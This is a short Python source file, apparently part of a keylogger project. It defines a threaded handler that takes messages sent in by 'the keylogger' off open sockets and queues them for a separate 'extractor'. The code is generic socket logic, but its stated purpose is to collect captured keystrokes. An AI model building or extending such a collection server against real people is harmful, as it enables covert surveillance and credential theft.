import socket
import threading
import struct
import string
import Queue

class Handler(threading.Thread):
	'''
	This is an active thread that is responsible for serving all
	messages that come in from the keylogger. It simply strips
	them out of the socket and dumps them in the queue for the 
	extractor to use at a later point in time.
	'''

	def __init__(self, serv, queue):
		threading.Thread.__init__(self)
		self.server = serv
		self.clientList = []
		self.running = True
		self.queue = queue
		print("Handler created.")

	def run(self):
		print("Beginning handler loop.")
		while self.running:
			for client in self.clientList:
				#print("trying to receive message...")
				message = client.sock.recv(self.server.BUFFSIZE)
				if message != None and message != "":
					print("client message: ", message) # debug
					self.queue.put(message)
